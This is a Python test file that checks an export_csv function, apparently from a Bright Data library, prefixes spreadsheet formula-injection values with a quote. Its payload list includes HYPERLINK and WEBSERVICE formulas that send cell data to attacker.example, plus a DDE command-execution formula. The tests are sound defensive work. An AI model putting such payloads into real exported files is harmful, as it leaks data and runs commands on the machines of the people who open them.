"""
Tests for CSV/formula injection sanitization in export_csv (CWE-1236).

Scraped, attacker-influenced data (e.g. product titles from untrusted sites)
must not be written verbatim into CSV cells when the value would be
interpreted as a formula by Excel/Google Sheets/LibreOffice (leading
'=', '+', '-', '@', tab, or CR). By default export_csv now prefixes such
values with a single quote; `sanitize=False` preserves the old byte-exact
behavior for callers who explicitly opt out.
"""

import csv

import pytest

from brightdata.datasets.utils import export, export_csv

FORMULA_PAYLOADS = [
    '=HYPERLINK("https://attacker.example/leak?p="&A1,"click")',
    '+WEBSERVICE("https://attacker.example/exfil")',
    "-2+3",
    "@SUM(1,1)",
    '=cmd|"/c calc"!A0',
]


class TestExportCsvSanitization:
    def test_default_sanitizes_formula_prefixes(self, tmp_path):
        data = [{"name": payload} for payload in FORMULA_PAYLOADS]
        filepath = export_csv(data, tmp_path / "out.csv")

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        for row, payload in zip(rows, FORMULA_PAYLOADS):
            # Reader gives us the value with the CSV-level quoting already
            # stripped, so a leading "'" means our sanitizer ran.
            assert row["name"] == "'" + payload

    def test_raw_file_does_not_contain_bare_formula_at_line_start(self, tmp_path):
        data = [{"name": '=HYPERLINK("https://attacker.example/leak","x")'}]
        filepath = export_csv(data, tmp_path / "out.csv")

        raw = filepath.read_text(encoding="utf-8")
        # The dangerous cell must not start a CSV field with '=' after
        # sanitization - it should be prefixed with a quote marker.
        assert "'=HYPERLINK" in raw

    def test_safe_values_are_untouched(self, tmp_path):
        data = [{"name": "Regular Product Name", "price": "19.99", "count": 5}]
        filepath = export_csv(data, tmp_path / "out.csv")

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        assert rows[0]["name"] == "Regular Product Name"
        assert rows[0]["price"] == "19.99"
        assert rows[0]["count"] == "5"

    def test_sanitize_false_preserves_legacy_behavior(self, tmp_path):
        payload = '=HYPERLINK("https://attacker.example/leak","x")'
        data = [{"name": payload}]
        filepath = export_csv(data, tmp_path / "out.csv", sanitize=False)

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        assert rows[0]["name"] == payload

    def test_non_string_values_are_unaffected(self, tmp_path):
        data = [{"count": 5, "ratio": 1.5, "active": True, "missing": None}]
        filepath = export_csv(data, tmp_path / "out.csv")

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        assert rows[0]["count"] == "5"
        assert rows[0]["ratio"] == "1.5"
        assert rows[0]["active"] == "True"
        assert rows[0]["missing"] == ""

    def test_flattened_nested_values_use_flattened_string_for_sanitization(self, tmp_path):
        # Sanitization runs after JSON-flattening. json.dumps always wraps
        # lists/dicts in '[' or '{', so the flattened string itself is never
        # mistaken for a formula - this pins down that ordering/behavior.
        data = [{"tags": ["=1+1", "safe"]}]
        filepath = export_csv(data, tmp_path / "out.csv")

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        assert rows[0]["tags"] == '["=1+1", "safe"]'

    @pytest.mark.parametrize("trigger", ["=", "+", "-", "@", "\t", "\r"])
    def test_all_documented_trigger_characters_are_escaped(self, tmp_path, trigger):
        data = [{"name": f"{trigger}payload"}]
        filepath = export_csv(data, tmp_path / "out.csv")

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        assert rows[0]["name"] == f"'{trigger}payload"

    def test_export_auto_detect_forwards_sanitize_kwarg(self, tmp_path):
        payload = '=HYPERLINK("https://attacker.example/leak","x")'
        data = [{"name": payload}]
        filepath = export(data, tmp_path / "out.csv", sanitize=False)

        with open(filepath, newline="", encoding="utf-8") as f:
            rows = list(csv.DictReader(f))

        assert rows[0]["name"] == payload

    def test_empty_data_still_touches_file(self, tmp_path):
        filepath = export_csv([], tmp_path / "out.csv")
        assert filepath.exists()
        assert filepath.read_text(encoding="utf-8") == ""
